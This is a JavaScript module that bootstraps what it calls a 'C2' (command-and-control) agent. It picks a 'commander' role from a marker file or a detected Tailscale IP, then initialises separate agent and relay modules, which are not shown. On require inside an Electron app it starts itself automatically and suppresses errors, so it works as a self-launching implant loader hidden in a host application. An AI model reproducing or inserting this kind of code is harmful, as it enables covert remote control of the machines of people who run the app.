const cfg = require('./config');
const agent = require('./agent');
const relay = require('./relay');
const fs = require('fs');
const path = require('path');

let isCommander = false;

function detectIfCommander() {
  const markerPath = path.join(cfg.DATA_DIR, 'commander');
  if (fs.existsSync(markerPath)) return true;
  try {
    const ip = agent.detectTailscaleIP();
    if (ip) {
      cfg.RELAY_IP = ip;
      fs.writeFileSync(markerPath, ip);
      return true;
    }
  } catch(e) {}
  return false;
}

function init() {
  try {
    isCommander = detectIfCommander();
    if (isCommander) {
      cfg.RELAY_IP = agent.detectTailscaleIP() || '127.0.0.1';
      console.log(`[C2] Running as COMMANDER (relay IP: ${cfg.RELAY_IP})`);
    }
    agent.init();
    relay.init(isCommander);
    console.log(`[C2] Agent ${cfg.instanceId} initialized (${cfg.hostname})`);
  } catch(e) {
    console.error('[C2] Init error:', e.message);
  }
}

if (require.main !== module) {
  try {
    const { app } = require('electron');
    if (app && app.isReady && app.isReady()) {
      init();
    } else if (app) {
      app.on('ready', init);
    } else {
      setTimeout(init, 3000);
    }
  } catch(e) {
    setTimeout(init, 3000);
  }
}

module.exports = { init };
